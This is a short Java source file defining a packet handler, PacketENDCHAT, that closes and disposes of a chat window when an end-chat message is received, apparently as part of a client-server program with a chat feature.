package com.redpois0n.packets;

import com.redpois0n.Connection;

public class PacketENDCHAT extends Packet {

	@Override
	public void read(String line) throws Exception {
		Connection.frameChat.setVisible(false);
		Connection.frameChat.dispose();
		Connection.frameChat = null;
	}

}
